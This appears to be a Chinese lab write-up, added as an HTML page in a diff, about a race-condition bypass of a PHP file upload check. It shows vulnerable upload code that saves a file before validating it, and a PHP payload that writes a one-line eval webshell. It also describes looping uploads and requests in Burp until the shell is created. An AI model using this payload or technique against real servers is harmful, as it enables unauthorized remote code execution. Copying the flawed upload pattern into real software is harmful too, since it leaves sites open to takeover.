@@ -1,0 +1,38 @@
+<h1 id="条件竞争与绕过"><a href="#条件竞争与绕过" class="headerlink" title="条件竞争与绕过"></a>条件竞争与绕过</h1><pre><code class="language-php">$is_upload = false;
+$msg = null;
+
+if(isset($_POST[&#39;submit&#39;])){
+    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);
+    $file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;];
+    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+    $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1);
+    $upload_file = UPLOAD_PATH . &#39;/&#39; . $file_name;
+
+    if(move_uploaded_file($temp_file, $upload_file)){
+        if(in_array($file_ext,$ext_arr)){
+             $img_path = UPLOAD_PATH . &#39;/&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
+             rename($upload_file, $img_path);
+             $is_upload = true;
+        }else{
+            $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
+            unlink($upload_file);
+        }
+    }else{
+        $msg = &#39;上传出错！&#39;;
+    }
+}
+</code></pre>
+<blockquote>
+<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST["a"])?><p>‘);?&gt;   &#x2F;&#x2F;生成小马</p>
+<p>fput函数：打开文件资源,如果shell.php不存在的话，我将新建shell.php文件,’w’以写入的方式把一句话木马写入到shell.php中</p>
+</blockquote>
+<blockquote>
+<p>文件竞争，是因为这个文件要到服务器去处理，到服务器处理的话那么服务器就会有判断时间（if时长），那我们不断地上传，只要有一时刻生成小马文件上传成功，那么我们就有了一句话木马得到权限</p>
+</blockquote>
+<p><img src="/assets/image-20250123214234-jpnq0tp.png" alt="image"> </p>
+<blockquote>
+<p>我们只需要不断地上传这个小马文件，然后让系统有一瞬间处理勒这个小马文件</p>
+</blockquote>
+<p>即我上传的111.php生成小马文件，那么我访问&#x2F;upload&#x2F;111.php</p>
+<p>上传和访问都在burp上面循环访问，知道生成shell.php成功，访问shell.php</p>
+<p>‍</p>
